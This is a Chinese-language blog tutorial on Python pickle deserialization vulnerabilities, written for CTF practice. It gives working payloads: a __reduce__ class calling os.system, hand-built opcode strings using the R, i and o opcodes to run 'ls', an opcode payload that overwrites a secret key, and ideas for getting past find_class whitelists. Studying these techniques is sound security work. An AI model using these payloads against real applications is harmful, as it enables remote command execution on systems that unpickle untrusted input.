<!-- build time:Mon Nov 17 2025 21:44:53 GMT+0800 (中国标准时间) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="静谧之处" href="https://peppermint0323.github.io/rss.xml"><link rel="alternate" type="application/atom+xml" title="静谧之处" href="https://peppermint0323.github.io/atom.xml"><link rel="alternate" type="application/json" title="静谧之处" href="https://peppermint0323.github.io/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><link rel="canonical" href="https://peppermint0323.github.io/2025/11/03/special/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><title>Pickle反序列化 - 专项 | Peppermintの小窝 = 静谧之处 = persistence</title><meta name="generator" content="Hexo 7.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">Pickle反序列化</h1><div class="meta"><span class="item" title="创建时间：2025-11-03 15:01:12"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2025-11-03T15:01:12+08:00">2025-11-03</time> </span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i> </span><span class="text">本文字数</span> <span>4.4k</span> <span class="text">字</span> </span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i> </span><span class="text">阅读时长</span> <span>4 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">Peppermintの小窝</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><img src="/asserts/python2.jpg"></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/special/" itemprop="item" rel="index" title="分类于 专项"><span itemprop="name">专项</span></a><meta itemprop="position" content="1"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://peppermint0323.github.io/2025/11/03/special/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="Peppermint"><meta itemprop="description" content="persistence, "></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="静谧之处"></span><div class="body md" itemprop="articleBody"><p>偷偷摸摸来开一个新坑～</p><h3 id="前置铺垫"><a class="anchor" href="#前置铺垫">#</a> <strong>前置铺垫</strong></h3><p>这段时间看到一个 pickle 反序列化实现变量覆盖的题目，正好之前没怎么接触过，开一个坑来浅浅了解一下<br>先来看一个简单的例子</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> pickle</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">class</span> <span class="token class-name">Person</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"ctf"</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        self<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">20</span></pre></td></tr><tr><td data-num="6"></td><td><pre>p <span class="token operator">=</span> Person<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>opcode <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>opcode<span class="token punctuation">)</span></pre></td></tr></table></figure><p>其序列化结果是 <code>b'\x80\x04\x954\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x06Person\x94\x93\x94)\x81\x94&#125;\x94(\x8c\x04name\x94\x8c\x03ctf\x94\x8c\x03age\x94K\x14ub.'</code><br>返回的是字节码，内置的 pickletools 模块可以反汇编字节码帮助解读</p><pre><code>    0: \x80 PROTO      4 Protocol version indicator.
    2: \x95 FRAME      52 Indicate the beginning of a new frame.
   11: \x8c SHORT_BINUNICODE '__main__' Push a Python Unicode string object.
   21: \x94 MEMOIZE    (as 0)           Store the stack top into the memo.  The stack is not popped.
   22: \x8c SHORT_BINUNICODE 'Person'   Push a Python Unicode string object.
   30: \x94 MEMOIZE    (as 1)           Store the stack top into the memo.  The stack is not popped.
   31: \x93 STACK_GLOBAL                Push a global object (module.attr) on the stack.
   32: \x94 MEMOIZE    (as 2)           Store the stack top into the memo.  The stack is not popped.
   33: )    EMPTY_TUPLE                 Push an empty tuple.
   34: \x81 NEWOBJ                      Build an object instance.
   35: \x94 MEMOIZE    (as 3)           Store the stack top into the memo.  The stack is not popped.
   36: &#125;    EMPTY_DICT                  Push an empty dict.
   37: \x94 MEMOIZE    (as 4)           Store the stack top into the memo.  The stack is not popped.
   38: (    MARK                        Push markobject onto the stack.
   39: \x8c     SHORT_BINUNICODE 'name' Push a Python Unicode string object.
   45: \x94     MEMOIZE    (as 5)       Store the stack top into the memo.  The stack is not popped.
   46: \x8c     SHORT_BINUNICODE 'ctf'  Push a Python Unicode string object.
   51: \x94     MEMOIZE    (as 6)       Store the stack top into the memo.  The stack is not popped.
   52: \x8c     SHORT_BINUNICODE 'age'  Push a Python Unicode string object.
   57: \x94     MEMOIZE    (as 7)       Store the stack top into the memo.  The stack is not popped.
   58: K        BININT1    20           Push a one-byte unsigned integer.
   60: u        SETITEMS   (MARK at 38) Add an arbitrary number of key+value pairs to an existing dict.
   61: b    BUILD                       Finish building an object, via __setstate__ or dict update.
   62: .    STOP                        Stop the unpickling machine.
</code></pre><p>这给你展现得明明白白<br>后续的反序列化就是通过 pickle.loads () 调用 pickle.py 中的 <code>_Unpickler</code> 对象实现 (当然 loads 调用只是其中一种用法)<br>这里简单描述一下其中的 load 函数</p><p><img data-src="https://github.com/Peppermint0323/img-post/blob/master/special/pickle1.png?raw=true" alt=""><br>其实就是依次按表读取并操作，顺着前面序列化返回的字节码，按顺序理解一遍就大概清楚了，具体跟着代码调试就不展开了</p><h3 id="反序列化漏洞"><a class="anchor" href="#反序列化漏洞">#</a> <strong>反序列化漏洞</strong></h3><p>其本质就是想办法修改字节码从而在反序列化时完成自己想做的操作</p><h4 id="reduce"><a class="anchor" href="#reduce">#</a> ** <strong>reduce</strong> **</h4><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> pickle</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> pickletools</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> os</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">class</span> <span class="token class-name">Person</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"ctf"</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        self<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">20</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        command <span class="token operator">=</span> <span class="token string">r'ls'</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token keyword">return</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span> <span class="token punctuation">(</span>command<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>p <span class="token operator">=</span> Person<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>opcode <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>pickletools<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>opcode<span class="token punctuation">,</span> annotate<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>P <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>opcode<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>P<span class="token punctuation">)</span></pre></td></tr></table></figure><p><code>__reduce__</code> 是 python 的协议方法，可以用于自定义对象的序列化行为。当返回字符串时直接在全局命名空间中查找该名称对应的对象；当返回元组时调用 callable 并传入 args 来重建对象<br>上面这个例子就是调用 os.system 并传入 command<br><img data-src="https://github.com/Peppermint0323/img-post/blob/master/special/pickle2.png?raw=true" alt=""><br>之前的 reduce 虽好，但只能只能执行一个函数，当遇到需要执行多函数解决问题时就需要依靠手动编写 opcode 来解决<br>这里还提一嘴 pickle 不同写协议版本的 opcode 写法不一样，但是向下兼容，即版本为 0 的 opcode 可以在任意版本 picke 中被反序列化且比较容易看懂<br>关于其中具体操作码部分就不过多阐述，在 pickle.py 中你可以找到详细释义（其实是简陋的英文版注释）<br><img data-src="https://github.com/Peppermint0323/img-post/blob/master/special/pickle3.png?raw=true" alt=""><br>先通过几个例子练练手熟悉一下</p><h4 id="实例化对象"><a class="anchor" href="#实例化对象">#</a> <strong>实例化对象</strong></h4><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">class</span> <span class="token class-name">Person</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>age<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name</pre></td></tr><tr><td data-num="4"></td><td><pre>        self<span class="token punctuation">.</span>age <span class="token operator">=</span> age</pre></td></tr></table></figure><p>尝试手动编写一下 opcode 实例化一下 Person 对象<br>首先 <code>c__main__\nPerson\n</code> ，表示 import <code>__main__</code> 模块获取 Person 类<br>然后 <code>(</code> 表示开始参数元组<br>其次 <code>S'ctf'\nI20\n</code> 表示设置参数<br>再是 <code>tR.</code> 表示结束元组重建对象并结束<br>结合来看就是 <code>c__main__\nPerson\n(S'ctf'\nI20\ntR.</code><br>验证一下：<br><img data-src="https://github.com/Peppermint0323/img-post/blob/master/special/pickle4.png?raw=true" alt=""></p><h4 id="构造函数"><a class="anchor" href="#构造函数">#</a> <strong>构造函数</strong></h4><p>构造函数进行命令执行存在经典三操作码：R、i、o（Rio 说是）<br>其中对于 R 的描述是， <code>apply callable to argtuple, both on stack</code> ，即选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数<br>其实就和上面实例化对象差不多： <code>cos\nsystem\n(S'ls'\ntR.</code><br>然后我们先来看 o， <code>build &amp; push class instance</code> 扩写一下就是，寻找栈中的上一个 MARK，以之间的第一个数据（必须为函数）为 callable，第二个到第 n 个数据为参数，执行该函数（或实例化一个对象）<br>MARK 就是 (, 写一下例子就看得懂了<br>首先是 <code>(</code> 起手，后面就是一样的操作：</p><pre><code>(cos
system
S'ls'
o.
</code></pre><p>合起来就是 <code>(cos\nsystem\nS'ls'\no.</code><br>最后一个 i，其注释和 o 一模一样，但是它其实相当于 c 和 o 的组合，先获取一个全局函数，然后寻找栈中的上一个 MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）<br>听起来比较绕，实际上就是在 o 的基础上稍微换个顺序，先获取全局函数就 <code>ios\nsystem</code> ，将夹在全局函数与上个 MARK 之间的东西作为参数来执行函数</p><pre><code>(S'ls'
ios
system
.
</code></pre><h4 id="变量覆盖"><a class="anchor" href="#变量覆盖">#</a> <strong>变量覆盖</strong></h4><p>这个操作使用操作码 d 与 b，d 操作码具体就是寻找栈中的上一个 MARK，并组合之间的数据为字典（数据必须有偶数个，即呈 key-value 对）<br>b 就是使用栈中的第一个元素（储存多个属性名：属性值的字典）对第二个元素（对象实例）进行属性设置<br><span class="exturl" data-url="aHR0cDovL3huLS1rZXlzZWNyZXQtdTc1bm9vNjhlZTk4YnZqaDl1OGFtdzZhb3d6ZTlrM2IucHk=">比如我们设置一个 key 在 secret.py</span>，现在想将其改为别的值</p><pre><code>c__main__
secret
(S'key'
S'abc'
db.
</code></pre><p><img data-src="https://github.com/Peppermint0323/img-post/blob/master/special/pickle5.png?raw=true" alt=""></p><h3 id="绕过waf"><a class="anchor" href="#绕过waf">#</a> <strong>绕过 WAF</strong></h3><p>前面提到 pickle 会 unpickling 一些带有恶意代码的字节流从而造成危害，除了主观上建议不要反序列化不受信任的或来源不确定的数据外，还有一个叫做 <code>find_class()</code> 的函数，通过重写的方式添加白名单来限制全局变量<br>简单看一下函数原本的样子<br><img data-src="https://github.com/Peppermint0323/img-post/blob/master/special/pickle6.png?raw=true" alt=""><br>那段动态导入模块的语句就是漏洞来源，这里还需要清楚一点，那就是什么时候会调用这个函数，还是从源代码寻找答案<br><img data-src="https://github.com/Peppermint0323/img-post/blob/master/special/pickle7.png?raw=true" alt=""><br>这是 <code>INST</code> 指令（操作码 i）python2 用于实例创建的 opcode，这里调用了一次<br><img data-src="https://github.com/Peppermint0323/img-post/blob/master/special/pickle8.png?raw=true" alt=""><br>这是 <code>GLOBAL</code> 指令（操作码 c）python3 用于加载某个模块里的全局类或函数<br><img data-src="https://github.com/Peppermint0323/img-post/blob/master/special/pickle9.png?raw=true" alt=""><br>这是 <code>STACK_GLOBAL</code> 指令（操作码 b'\x93'）, 协议 5（Python3.8+），也是加载全局对象，但模块名和对象名从栈顶读取<br>从这里可以看出这都是调用 <code>find_class</code> 的函数，用于处理特定 opcode 而且其中的 <code>find_class</code> 只会被调用一次，只要你能绕过这里，后面就畅通无阻。</p><p>官方文档里以 <code>__builtins__</code> 作为白名单示例<br><img data-src="https://github.com/Peppermint0323/img-post/blob/master/special/pickle10.png?raw=true" alt=""><br>当然这段不仅限制为 builtins 模块而且还只能使用其中的安全类，没法绕，所以我们讨论的范围仅是 builtins 模块或者其他不是很严格的限制<br>其实这一部分也是老生常谈，对经常写沙箱逃逸的师傅估计是洒洒水啦<br>为了水字数也说一说 ()<br>比如在 builtins 模块下限制了常见的 eval、exec 这种危险代码类，还有 <code>__import__</code> 模块导入、globals () 获取所有模块内容结合 <code>getattr</code> 这种通过属性访问获取命令执行函数的形式等<br>别的比如限制白名单为 <code>__main__</code> ，有引用全局变量啥的，也可以根据题目进行变量覆盖<br>当然思路是这样的，实操起来肯定还会涉及很多编写 opcode 的情况，那就是另一回事了，前面基本都提过常用的一些 opcode 写法</p><h3 id="总结"><a class="anchor" href="#总结">#</a> <strong>总结</strong></h3><p>面对 pickle 反序列化问题，其实总共就分为两部分，一个是有什么限制条件，怎么绕过，另一个就是如何编写对应的 opcode 来实现你的绕过思路</p><p><strong>参考文章</strong><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL25ld3MvNzAzMiN0b2MtMA==">https://xz.aliyun.com/news/7032#toc-0</span><br><span class="exturl" data-url="aHR0cHM6Ly9nb29kYXBwbGUudG9wL2FyY2hpdmVzLzEwNjk=">https://goodapple.top/archives/1069</span><br><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvemgtY24vMy9saWJyYXJ5L3BpY2tsZS5odG1sI3Jlc3RyaWN0aW5nLWdsb2JhbHM=">https://docs.python.org/zh-cn/3/library/pickle.html#restricting-globals</span></p></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i> </span><span class="text">更新于</span> <time title="修改时间：2025-11-17 21:42:52" itemprop="dateModified" datetime="2025-11-17T21:42:52+08:00">2025-11-17</time></span></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>Peppermint <i class="ic i-at"><em>@</em></i>静谧之处</li><li class="link"><strong>本文链接：</strong> <a href="https://peppermint0323.github.io/2025/11/03/special/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Pickle反序列化">https://peppermint0323.github.io/2025/11/03/special/Python反序列化/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2025/07/10/special/Java/CC%E9%93%BE/" itemprop="url" rel="prev" data-background-image="&#x2F;asserts&#x2F;java-2.jpg" title="CC链"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> java</span><h3>CC链</h3></a></div><div class="item right"></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E9%93%BA%E5%9E%AB"><span class="toc-number">1.</span> <span class="toc-text">前置铺垫</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#reduce"><span class="toc-number">2.1.</span> <span class="toc-text">** reduce **</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%AF%B9%E8%B1%A1"><span class="toc-number">2.2.</span> <span class="toc-text">实例化对象</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0"><span class="toc-number">2.3.</span> <span class="toc-text">构造函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-number">2.4.</span> <span class="toc-text">变量覆盖</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87waf"><span class="toc-number">3.</span> <span class="toc-text">绕过 WAF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li><a href="/2025/04/17/special/Flask%E5%86%85%E5%AD%98%E9%A9%AC/" rel="bookmark" title="Flask内存马">Flask内存马</a></li><li><a href="/2025/07/05/special/Java/java%E5%90%AF%E7%A8%8B/" rel="bookmark" title="java启程">java启程</a></li><li><a href="/2025/07/07/special/Java/%E5%8F%8D%E5%B0%84%E4%B8%8E%E5%AD%97%E8%8A%82%E7%A0%81/" rel="bookmark" title="反射与字节码">反射与字节码</a></li><li><a href="/2025/07/10/special/Java/CC%E9%93%BE/" rel="bookmark" title="CC链">CC链</a></li><li class="active"><a href="/2025/11/03/special/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="bookmark" title="Pickle反序列化">Pickle反序列化</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="Peppermint" data-src="/images/avatar.jpg"><p class="name" itemprop="name">Peppermint</p><div class="description" itemprop="description"></div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">21</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">8</span> <span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">1</span> <span class="name">标签</span></a></div></nav><div class="social"></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>friends</a></li><li class="item"><a href="/links/" rel="section"><i class="ic i-magic"></i>links</a></li></ul></div></div></div><ul id="quick"><li class="prev pjax"></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/penetration/" title="分类于 渗透">渗透</a> <i class="ic i-angle-right"></i> <a href="/categories/penetration/hackthebox/" title="分类于 HTB">HTB</a></div><span><a href="/2025/01/27/penetration/hackthebox/UnderPass/" title="UnderPass">UnderPass</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/penetration/" title="分类于 渗透">渗透</a> <i class="ic i-angle-right"></i> <a href="/categories/penetration/hackthebox/" title="分类于 HTB">HTB</a></div><span><a href="/2025/03/08/penetration/hackthebox/Cypher/" title="cypher">cypher</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/penetration/" title="分类于 渗透">渗透</a> <i class="ic i-angle-right"></i> <a href="/categories/penetration/hackthebox/" title="分类于 HTB">HTB</a></div><span><a href="/2025/02/12/penetration/hackthebox/Cicada/" title="Cicada">Cicada</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/penetration/" title="分类于 渗透">渗透</a> <i class="ic i-angle-right"></i> <a href="/categories/penetration/hackthebox/" title="分类于 HTB">HTB</a></div><span><a href="/2025/01/30/penetration/hackthebox/LinkVortex/" title="LinkVortex">LinkVortex</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/ctf/" title="分类于 CTF">CTF</a></div><span><a href="/2025/01/21/CTF/BaseCTF/" title="BaseCTF">BaseCTF</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/penetration/" title="分类于 渗透">渗透</a> <i class="ic i-angle-right"></i> <a href="/categories/penetration/hackthebox/" title="分类于 HTB">HTB</a></div><span><a href="/2025/02/04/penetration/hackthebox/Chemistry/" title="Chemistry">Chemistry</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2025/03/23/penetration/hackthebox/Titanic/" title="Titanic">Titanic</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/ctf/" title="分类于 CTF">CTF</a></div><span><a href="/2025/01/15/CTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982024/" title="极客大挑战2024">极客大挑战2024</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/penetration/" title="分类于 渗透">渗透</a> <i class="ic i-angle-right"></i> <a href="/categories/penetration/hackthebox/" title="分类于 HTB">HTB</a></div><span><a href="/2025/01/28/penetration/hackthebox/HTB%E9%99%8D%E4%BD%8E%E5%BB%B6%E8%BF%9F/" title="HTB降低延迟">HTB降低延迟</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/penetration/" title="分类于 渗透">渗透</a> <i class="ic i-angle-right"></i> <a href="/categories/penetration/hackthebox/" title="分类于 HTB">HTB</a></div><span><a href="/2025/02/25/penetration/hackthebox/Instant/" title="instant">instant</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2010 – <span itemprop="copyrightYear">2025</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">Peppermint @ Peppermintの小窝</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="站点总字数">79k 字</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="站点阅读时长">1:12</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"2025/11/03/special/Python反序列化/",favicon:{show:"（●´3｀●）やれやれだぜ",hide:"(´Д｀)大変だ！"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html><!-- rebuild by hrmmi -->